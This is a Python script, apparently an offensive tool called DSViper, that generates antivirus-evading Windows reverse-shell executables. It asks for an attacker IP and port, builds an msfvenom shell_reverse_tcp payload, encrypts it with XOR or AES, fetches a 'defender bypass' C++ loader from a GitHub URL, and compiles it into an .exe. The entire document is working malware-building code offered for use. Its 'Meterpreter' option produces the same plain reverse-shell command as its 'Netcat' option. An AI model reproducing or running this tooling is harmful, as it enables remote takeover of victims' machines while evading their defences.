#!/usr/bin/python3 
import os
import argparse
import sys
import random
from os import urandom
import requests
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib

def xorEncrypt(plaintext, key):
    print("\n")
    
    ciphertext = bytearray()
    for i in range(len(plaintext)):
        # XOR each byte with the key in a repeating pattern
        ciphertext.append(plaintext[i] ^ key[i % len(key)])
    
    return bytes(ciphertext)
    
    
def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()  # Derive the AES key using SHA-256
    iv = 16 * b'\x00'  # Initialization vector (16 bytes, zeroed)
    plaintext = pad(plaintext, AES.block_size)  # Pad the plaintext
    cipher = AES.new(k, AES.MODE_CBC, iv)  # Create AES cipher in CBC mode
    ciphertext = cipher.encrypt(plaintext)  # Encrypt the padded plaintext
    return ciphertext, key
    
def OURFIRSTMETHODXOR():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    if payloadtype == '1':
       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
    elif payloadtype == '2':
       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
    else:
       print("invalid option")
       exit(1)
    
    subprocess.run(msfvenom_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    with open("payload.bin", "rb") as file:
        content = file.read()
    key = [random.randint(0, 255) for _ in range(16)]
    ciphertext = xorEncrypt(content, key)

    XOR_key = bytes(key)
    with open("key.bin", "wb") as f:
        f.write(XOR_key)

    XOR_code = bytes(ciphertext)
    with open("code.bin", "wb") as f:
        f.write(XOR_code)

    with open("resources.rc", "wb") as f:
        f.write('AESCODE   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('AESKEY    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/XORbypass.cpp"
    try:
        res = requests.get(url)
        with open("XORbypass.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)

    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper1.exe", "XORbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper1.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "XORbypass.cpp"]
    for file in files:
        os.remove(file)

def OURSECONDMETHODAES():
    GREEN = "\033[92m"
    BOLD = "\033[1m"
    WHITE = "\033[97m"
    if payloadtype == '1':
       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
    elif payloadtype == '2':
       msfvenom_command = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ipadd} LPORT={port} -f raw > payload.bin"
    else:
       print("invalid option")
       exit(1)
    subprocess.run(msfvenom_command,shell=True, check=True ,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    
    with open("payload.bin", "rb") as file:
            content = file.read()
    KEY = urandom(16)
    
    ciphertext, key = AESencrypt(content, KEY)
    
    with open("key.bin", "wb") as key_file:
        key_file.write(KEY)

    # Save the encrypted payload to a binary file (AEScode.bin)
    with open("code.bin", "wb") as code_file:
        code_file.write(ciphertext)
    
    with open("resources.rc", "wb") as f:
        f.write('AESCODE   RCDATA   "code.bin"\n'.encode('utf-8'))
        f.write('AESKEY    RCDATA   "key.bin"\n'.encode('utf-8'))

    url = "https://raw.githubusercontent.com/dagowda/XOR_resource_defender_bypass_2025/refs/heads/main/AES/AESbypass.cpp"
    try:
        res = requests.get(url)
        with open("AESbypass.cpp", "wb") as f:
            f.write(res.content)
    except requests.RequestException as e:
        print(f"Error: {e}")
        exit(1)
    
    try:
        subprocess.run(["x86_64-w64-mingw32-windres", "resources.rc", "-O", "coff", "-o", "resources.res"], check=True)
        subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "DSViper2.exe", "AESbypass.cpp", "resources.res", "-fpermissive", "-lws2_32"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}{BOLD}[*]Payload successfully created as DSViper2.exe")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

    files = ["payload.bin", "code.bin", "key.bin", "resources.res", "resources.rc", "AESbypass.cpp"]
    for file in files:
        os.remove(file)
    

if __name__ == "__main__":
    WHITE = "\033[97m"
    RED = "\33[91m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BOLD = "\033[1m"
    RESET = "\033[0m"
    banner = f"""
            {RED}{BOLD}

░▒▓███████▓▒░ ░▒▓███████▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░              ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░        ░▒▓█▓▒▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░        ░▒▓█▓▓█▓▒░ ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓███████▓▒░          ░▒▓██▓▒░  ░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
                                                                                             
                                                                                                
    """
    print(banner)

    ipadd = input(f"{WHITE}{BOLD}Enter your attacker machine's IP Address: ")
    port = input(f"{WHITE}{BOLD}Enter your attacker machine's Port: ")
    payloadtype= input(f"{WHITE}{BOLD}Please enter the number for the type of payload:\n1.) Netcat\n2.) Meterpreter\n>")
    stealth_type = input(f"{WHITE}{BOLD}Select your stealthy stride:\n1.) Moderate\n2.) High\n>")

    if payloadtype == "1":
        print(f"Selected payload: Netcat reverse shell")
    elif payloadtype == "2":
        print(f"Selected payload: Meterpreter reverse shell")
    else:
        print(f"Invalid payload selection. Please enter 1 or 2.")

    if stealth_type == "1":
        print(f"Selected stealth level: Moderate.")
        OURFIRSTMETHODXOR()
    elif stealth_type == "2":
        print(f"Selected stealth level: High.")
        OURSECONDMETHODAES()
    else:
        print(f"Invalid stealth level. Please enter 1 or 2")
